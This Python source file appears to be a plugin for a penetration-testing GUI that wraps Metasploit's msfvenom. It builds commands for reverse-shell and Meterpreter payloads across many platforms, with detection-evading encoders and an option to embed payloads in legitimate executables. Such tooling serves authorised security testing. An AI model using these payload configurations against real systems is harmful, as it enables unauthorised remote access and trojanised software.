# =============================================================================
# modules/msfvenom.py
#
# MSFVenom - Payload Generator Tool
# =============================================================================

import os
import shlex
import socket
import html
from datetime import datetime
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QFileDialog
)
from PySide6.QtCore import Qt

from modules.bases import ToolBase, ToolCategory
from ui.worker import ToolExecutionMixin
from core.fileops import RESULT_BASE
from ui.styles import (
    # Widgets
    RunButton, StopButton, BrowseButton,
    StyledLineEdit, StyledSpinBox, StyledCheckBox, StyledComboBox,
    StyledLabel, HeaderLabel, StyledGroupBox, OutputView,
    ToolSplitter, ConfigTabs, StyledToolView
)


class MSFVenomTool(ToolBase):
    """MSFVenom Payload Generator tool plugin."""

    name = "MSFVenom"
    category = ToolCategory.PAYLOAD_GENERATOR

    @property
    def description(self) -> str:
        return "Payload generator and encoder for the Metasploit Framework."

    @property
    def icon(self) -> str:
        return "💉"

    def get_widget(self, main_window: QWidget) -> QWidget:
        return MSFVenomToolView(main_window=main_window)


class MSFVenomToolView(StyledToolView, ToolExecutionMixin):
    """MSFVenom payload generator interface."""
    
    tool_name = "MSFVenom"
    tool_category = "PAYLOAD_GENERATOR"

    PAYLOADS = {
        "Windows (x64)": {
            "Meterpreter Staged": "windows/x64/meterpreter/reverse_tcp",
            "Meterpreter Stageless": "windows/x64/meterpreter_reverse_tcp",
            "Shell Staged": "windows/x64/shell/reverse_tcp",
            "Shell Stageless": "windows/x64/shell_reverse_tcp",
        },
        "Windows (x86)": {
            "Meterpreter Staged": "windows/meterpreter/reverse_tcp",
            "Meterpreter Stageless": "windows/meterpreter_reverse_tcp",
            "Shell Staged": "windows/shell/reverse_tcp",
            "Shell Stageless": "windows/shell_reverse_tcp",
        },
        "Linux (x64)": {
            "Meterpreter Staged": "linux/x64/meterpreter/reverse_tcp",
            "Shell Stageless": "linux/x64/shell_reverse_tcp",
        },
        "Linux (x86)": {
            "Meterpreter Staged": "linux/x86/meterpreter/reverse_tcp",
            "Shell Stageless": "linux/x86/shell_reverse_tcp",
        },
        "macOS (x64)": {
            "Meterpreter Staged": "osx/x64/meterpreter/reverse_tcp",
            "Shell Stageless": "osx/x64/shell_reverse_tcp",
        },
        "Android": {
            "Meterpreter": "android/meterpreter/reverse_tcp",
        },
        "PHP": {
            "Meterpreter": "php/meterpreter_reverse_tcp",
            "Reverse PHP": "php/reverse_php",
        },
        "Python": {
            "Meterpreter": "python/meterpreter_reverse_tcp",
            "Shell": "cmd/unix/reverse_python",
        },
        "Java/JSP": {
            "JSP Shell": "java/jsp_shell_reverse_tcp",
            "WAR Shell": "java/shell_reverse_tcp",
        },
    }

    ENCODERS = {
        "None": "",
        "x86/shikata_ga_nai": "x86/shikata_ga_nai",
        "x64/xor": "x64/xor",
        "x86/fnstenv_mov": "x86/fnstenv_mov",
        "php/base64": "php/base64",
    }

    FORMATS = {
        "Windows EXE": "exe",
        "Windows DLL": "dll",
        "Linux ELF": "elf",
        "macOS Macho": "macho",
        "Android APK": "apk",
        "Raw": "raw",
        "C Code": "c",
        "Python": "python",
        "PowerShell": "psh",
        "PHP": "php",
        "JSP": "jsp",
        "WAR": "war",
    }

    def __init__(self, main_window=None):
        super().__init__()
        self.main_window = main_window
        self.output_path = None
        self.log_file = None
        self._build_ui()
        self.update_command()

    def _build_ui(self):
        """Build UI."""
        # setStyleSheet handled by StyledToolView

        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        splitter = ToolSplitter()
        
        # ==================== CONTROL PANEL ====================
        control_panel = QWidget()
        # Removed legacy style
        control_layout = QVBoxLayout(control_panel)
        control_layout.setContentsMargins(10, 10, 10, 10)
        control_layout.setSpacing(10)

        # Header
        header = HeaderLabel(self.tool_category, self.tool_name)
        control_layout.addWidget(header)

        # Connection Group
        conn_group = StyledGroupBox("🔌 Connection")
        conn_layout = QHBoxLayout(conn_group)

        conn_layout.addWidget(StyledLabel("LHOST:"))
        self.lhost_input = StyledLineEdit()
        self.lhost_input.setPlaceholderText("IP Address")
        self.lhost_input.textChanged.connect(self.update_command)
        conn_layout.addWidget(self.lhost_input, 1)

        detect_btn = BrowseButton("📍 Detect") # Reuse browse button style for detect
        detect_btn.setToolTip("Auto-detect IP")
        detect_btn.clicked.connect(self._detect_ip)
        conn_layout.addWidget(detect_btn)
        
        conn_layout.addWidget(StyledLabel("LPORT:"))
        self.lport_spin = StyledSpinBox()
        self.lport_spin.setRange(1, 65535)
        self.lport_spin.setValue(4444)
        self.lport_spin.valueChanged.connect(self.update_command)
        conn_layout.addWidget(self.lport_spin)

        control_layout.addWidget(conn_group)

        # Payload Configuration
        payload_group = StyledGroupBox("🎯 Payload")
        payload_layout = QVBoxLayout(payload_group)

        p_row1 = QHBoxLayout()
        p_row1.addWidget(StyledLabel("Platform:"))
        self.platform_combo = StyledComboBox()
        self.platform_combo.addItems(list(self.PAYLOADS.keys()))
        self.platform_combo.currentTextChanged.connect(self._update_payloads)
        p_row1.addWidget(self.platform_combo, 1)
        
        p_row1.addWidget(StyledLabel("Payload:"))
        self.payload_combo = StyledComboBox()
        self.payload_combo.currentTextChanged.connect(self.update_command)
        p_row1.addWidget(self.payload_combo, 1)
        payload_layout.addLayout(p_row1)
        
        p_row2 = QHBoxLayout()
        p_row2.addWidget(StyledLabel("Format:"))
        self.format_combo = StyledComboBox()
        self.format_combo.addItems(list(self.FORMATS.keys()))
        self.format_combo.currentTextChanged.connect(self.update_command)
        p_row2.addWidget(self.format_combo)
        
        p_row2.addWidget(StyledLabel("Arch:"))
        self.arch_combo = StyledComboBox()
        self.arch_combo.addItems(["(auto)", "x86", "x64"])
        self.arch_combo.currentTextChanged.connect(self.update_command)
        p_row2.addWidget(self.arch_combo)
        payload_layout.addLayout(p_row2)
        
        control_layout.addWidget(payload_group)

        # Advanced / Encoding
        enc_group = StyledGroupBox("🔐 Advanced & Encoding")
        enc_layout = QHBoxLayout(enc_group) # Check if this is used or remove
        
        self.advanced_tabs = ConfigTabs()
        
        # Tab 1: Encoding
        enc_tab = QWidget()
        enc_tab_layout = QHBoxLayout(enc_tab)
        enc_tab_layout.setContentsMargins(10, 10, 10, 10)
        
        enc_tab_layout.addWidget(StyledLabel("Encoder:"))
        self.encoder_combo = StyledComboBox()
        self.encoder_combo.addItems(list(self.ENCODERS.keys()))
        self.encoder_combo.currentTextChanged.connect(self.update_command)
        enc_tab_layout.addWidget(self.encoder_combo, 1)
        
        enc_tab_layout.addWidget(StyledLabel("Iter:"))
        self.iter_spin = StyledSpinBox()
        self.iter_spin.setRange(1, 20)
        self.iter_spin.setValue(3)
        self.iter_spin.valueChanged.connect(self.update_command)
        enc_tab_layout.addWidget(self.iter_spin)
        
        enc_tab_layout.addWidget(StyledLabel("BadChars:"))
        self.badchars = StyledLineEdit()
        self.badchars.setPlaceholderText("\\x00")
        self.badchars.setMaximumWidth(80)
        self.badchars.textChanged.connect(self.update_command)
        enc_tab_layout.addWidget(self.badchars)
        
        self.advanced_tabs.addTab(enc_tab, "Encoding")
        
        # Tab 2: Template
        tmpl_tab = QWidget()
        tmpl_tab_layout = QHBoxLayout(tmpl_tab)
        tmpl_tab_layout.setContentsMargins(10, 10, 10, 10)
        
        self.template_check = StyledCheckBox("Template (-x)")
        self.template_check.stateChanged.connect(self._toggle_template)
        tmpl_tab_layout.addWidget(self.template_check)
        
        self.template_input = StyledLineEdit()
        self.template_input.setPlaceholderText("Select executable...")
        self.template_input.setEnabled(False)
        self.template_input.textChanged.connect(self.update_command)
        tmpl_tab_layout.addWidget(self.template_input, 1)
        
        self.template_btn = BrowseButton()
        self.template_btn.clicked.connect(self._browse_template)
        self.template_btn.setEnabled(False)
        tmpl_tab_layout.addWidget(self.template_btn)
        
        self.keep_check = StyledCheckBox("Keep (-k)")
        self.keep_check.setEnabled(False)
        self.keep_check.stateChanged.connect(self.update_command)
        tmpl_tab_layout.addWidget(self.keep_check)
        
        self.advanced_tabs.addTab(tmpl_tab, "Template")
        
        # Tab 3: Output
        out_tab = QWidget()
        out_tab_layout = QHBoxLayout(out_tab)
        out_tab_layout.setContentsMargins(10, 10, 10, 10)
        
        self.custom_out_check = StyledCheckBox("Custom Path")
        self.custom_out_check.stateChanged.connect(self._toggle_custom_out)
        out_tab_layout.addWidget(self.custom_out_check)
        
        self.output_input = StyledLineEdit()
        self.output_input.setPlaceholderText("(Auto-generated)")
        self.output_input.setReadOnly(True)
        self.output_input.textChanged.connect(self.update_command)
        out_tab_layout.addWidget(self.output_input, 1)
        
        self.output_btn = BrowseButton()
        self.output_btn.clicked.connect(self._browse_output)
        self.output_btn.setEnabled(False)
        out_tab_layout.addWidget(self.output_btn)
        
        self.advanced_tabs.addTab(out_tab, "Output")
        
        control_layout.addWidget(self.advanced_tabs)

        # Command Preview
        self.command_input = StyledLineEdit()
        self.command_input.setReadOnly(True)
        self.command_input.setPlaceholderText("Command preview...")
        control_layout.addWidget(self.command_input)

        # Buttons
        btn_layout = QHBoxLayout()
        self.run_button = RunButton("GENERATE PAYLOAD")
        self.run_button.clicked.connect(self.run_scan)
        self.stop_button = StopButton()
        self.stop_button.clicked.connect(self.stop_scan)
        
        btn_layout.addWidget(self.run_button)
        btn_layout.addWidget(self.stop_button)
        control_layout.addLayout(btn_layout)

        control_layout.addStretch()
        splitter.addWidget(control_panel)

        # Output View
        self.output = OutputView(self.main_window)
        self.output.setPlaceholderText("Generation log will appear here...")
        
        splitter.addWidget(self.output)
        splitter.setSizes([500, 300])

        main_layout.addWidget(splitter)
        
        # Init
        self._detect_ip()
        self._update_payloads()

    def _update_payloads(self):
        p = self.platform_combo.currentText()
        self.payload_combo.clear()
        if p in self.PAYLOADS:
            self.payload_combo.addItems(list(self.PAYLOADS[p].keys()))
        self.payload_combo.setCurrentIndex(0)
        self.update_command()

    def _toggle_template(self):
        enabled = self.template_check.isChecked()
        self.template_input.setEnabled(enabled)
        self.template_btn.setEnabled(enabled)
        self.keep_check.setEnabled(enabled)
        self.update_command()

    def _toggle_custom_out(self):
        enabled = self.custom_out_check.isChecked()
        self.output_input.setReadOnly(not enabled)
        self.output_btn.setEnabled(enabled)
        if not enabled:
            self.output_input.clear()
        self.update_command()

    def _browse_template(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Template")
        if path:
            self.template_input.setText(path)

    def _browse_output(self):
        path, _ = QFileDialog.getSaveFileName(self, "Save Payload As")
        if path:
            self.output_input.setText(path)

    def _detect_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.lhost_input.setText(s.getsockname()[0])
            s.close()
        except:
            self.lhost_input.setText("127.0.0.1")

    def _get_ext(self):
        fmt = self.FORMATS.get(self.format_combo.currentText(), "bin")
        m = {"exe": "exe", "dll": "dll", "elf": "elf", 
             "macho": "macho", "apk": "apk", "raw": "bin", "c": "c", 
             "python": "py", "psh": "ps1", "php": "php", "jsp": "jsp", "war": "war"}
        return m.get(fmt, "bin")

    def _get_output_path(self):
        if self.custom_out_check.isChecked() and self.output_input.text().strip():
             return self.output_input.text().strip()
             
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        platform = self.platform_combo.currentText().lower().split()[0]
        ext = self._get_ext()
        filename = f"payload_{platform}_{ts}.{ext}"
        d = os.path.join(RESULT_BASE, "payloads")
        os.makedirs(d, exist_ok=True)
        return os.path.join(d, filename)

    # -------------------------------------------------------------------------
    # Command Builder
    # -------------------------------------------------------------------------

    def build_command(self, preview: bool = False) -> str:
        cmd = ["msfvenom"]
        
        # Payload
        platform_name = self.platform_combo.currentText()
        payload_name = self.payload_combo.currentText()
        if platform_name in self.PAYLOADS and payload_name in self.PAYLOADS[platform_name]:
            cmd.extend(["-p", self.PAYLOADS[platform_name][payload_name]])
            
        # LHOST/LPORT
        lhost = self.lhost_input.text().strip()
        if lhost:
            cmd.append(f"LHOST={lhost}")
        elif not preview:
             raise ValueError("LHOST required")
        else:
             cmd.append("LHOST=<ip>")
             
        cmd.append(f"LPORT={self.lport_spin.value()}")
        
        # Arch
        arch = self.arch_combo.currentText()
        if arch != "(auto)":
            cmd.extend(["-a", arch])
            
        # Encoder
        enc = self.ENCODERS.get(self.encoder_combo.currentText(), "")
        if enc:
            cmd.extend(["-e", enc, "-i", str(self.iter_spin.value())])
            
        # Badchars
        bc = self.badchars.text().strip()
        if bc:
            cmd.extend(["-b", bc])
        
        # Template
        if self.template_check.isChecked():
            tmpl = self.template_input.text().strip()
            if tmpl:
                cmd.extend(["-x", tmpl])
                if self.keep_check.isChecked():
                    cmd.append("-k")
            elif not preview:
                raise ValueError("Template file required")
        
        # Output Format
        fmt = self.FORMATS.get(self.format_combo.currentText(), "raw")
        cmd.extend(["-f", fmt])
        
        # Output Path (Always last)
        if preview:
            cmd.extend(["-o", "<output_file>"])
        else:
            # Output path is handled in run_scan, but build_command should include it for validity
            # We'll append it in run_scan
            pass 
            
        return " ".join(shlex.quote(x) for x in cmd)

    def update_command(self):
        try:
            cmd_str = self.build_command(preview=True)
            self.command_input.setText(cmd_str)
        except Exception:
            self.command_input.setText("")

    # -------------------------------------------------------------------------
    # Execution
    # -------------------------------------------------------------------------

    def run_scan(self):
        try:
            cmd_str = self.build_command(preview=False)
            self.log_file = self._get_output_path()
            
            # Append output path
            cmd_str += f" -o {shlex.quote(self.log_file)}"
            
            self._info("Generating Payload...")
            self._section("MSFVENOM GENERATION")
            self._section("Command")
            self._raw(html.escape(cmd_str))
            self._raw("<br>")
            self._info(f"Target Output Path: {html.escape(self.log_file)}")
            
            self.start_execution(cmd_str, output_path=self.log_file)
            
        except Exception as e:
            self._error(str(e))

    def on_execution_finished(self):
        super().on_execution_finished()
        
        output_file = self.log_file
        if output_file and os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            self._section("Generation Successful")
            self._success(f"Payload saved to: {output_file}")
            self._notify("Payload generated successfully!")
        else:
            self._error("Generation failed or file is empty.")

    def on_new_output(self, line):
        clean = line.strip()
        if clean:
            self._raw(html.escape(clean))
